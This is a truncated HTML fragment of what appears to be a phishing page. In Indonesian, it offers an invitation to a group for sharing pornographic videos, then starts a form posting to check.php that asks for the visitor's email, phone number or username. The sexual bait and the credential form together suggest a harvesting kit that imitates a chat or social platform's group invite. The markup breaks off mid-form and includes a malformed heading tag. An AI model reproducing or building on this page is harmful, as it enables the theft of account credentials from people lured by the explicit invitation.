...
<div class="page-main__inner">
	<div class="page-content page-content--single">
		<div class="block block--invite">
			<a href="#" id="action-icon" title="Follow this link to join: Berbagi Video Bokep" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/18.jpg);"></span></a>
			<h2 class="block__title">Group Berbagi Bokep<h2>
			...
			<form action="check.php" method="post">
				<input type="text" name="email" placeholder="Alamat email, nomer handphone atau nama pengguna" required>
